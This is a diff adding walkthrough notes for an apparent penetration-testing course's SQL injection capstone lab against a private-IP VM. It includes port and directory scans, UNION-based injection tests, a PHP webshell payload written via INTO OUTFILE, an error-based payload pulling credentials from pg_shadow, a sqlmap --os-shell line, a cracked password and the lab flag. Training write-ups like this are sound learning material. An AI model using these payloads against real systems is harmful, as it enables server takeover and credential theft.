@@ -220,9 +220,63 @@ sqlmap -r subscribe_POST.txt -p mail-list --os-shell
 
 6. **Capstone Exercise**: Enumerate the Module Exercise - VM #3 and exploit the SQLi vulnerability in order to get the flag.
 
+```bash
+nmap -Pn 192.168.209.49
+	PORT     STATE SERVICE
+	22/tcp   open  ssh
+	80/tcp   open  http
+	5432/tcp open  postgresql
+
+feroxbuster -u http://192.168.209.49 -s 200 -s 301
+200      GET      245l     1051w    14484c http://192.168.209.49/blog.php
+200      GET      272l     1105w    15794c http://192.168.209.49/about.php
+301      GET        9l       28w      315c http://192.168.209.49/mail => http://192.168.209.49/mail/
+301      GET        9l       28w      314c http://192.168.209.49/img => http://192.168.209.49/img/
+200      GET       65l      166w     2598c http://192.168.209.49/mail/contact.js
+200      GET      192l      682w    10573c http://192.168.209.49/contact.php
+200      GET      783l     2739w    46446c http://192.168.209.49/index.php
+200      GET      268l     1017w    15171c http://192.168.209.49/feature.php
+200      GET      488l     1382w    27598c http://192.168.209.49/class.php
+```
+
+- Browsing shows **class.php** and **contact.php** have form fields.
+- Send their POST requests to Repeater 371-422 71-126 and test each parameter
+	![](10.3.2.6ex_class.png)
+
+- Given the error message (& a bit of googling), **order by** won't work.
+- Test with **union select** & null entries to find column numbers
+  ![](10ex_unionColumnTest.png)
+
+- Attempt webshell via INTO OUTFILE
+```sql
+UNION SELECT null, "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/webshell.php"-- //
+
+	-- Throws error
+	:  pg_query(): Query failed: ERROR:  syntax error at or near &quot;&quot;/var/www/html/webshell.php&quot;&quot;
+	LINE 1: ...['cmd']);?&gt;&quot;, null, null, null, null INTO OUTFILE &quot;/var/www/...
+	 ^ in <b>/var/www/html/class.php
+```
+- URL encoding doesn't work
+
+Considering the db is PostgresSQL, consulted [PayloadsAllTheThings PostgresSQL](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-error-based) section for payloads.
+- Eventually figured this out to return the password
+- Need to cast the passwd to convert to type int
+![](10.3.2.6ex_pw.png)
+- Grab user name
+```sql
+union select null, null, cast(user as int), null, null, null from pg_shadow-- //
+	-- rubben
+```
+
+- Crack password (avrillavigne)
+- Login
+```bash
+p
+```
 
 
-> Answer:  .
+
+> Answer:  OS{7076206eced8864d3637266b1da6d96c}
 
 
 
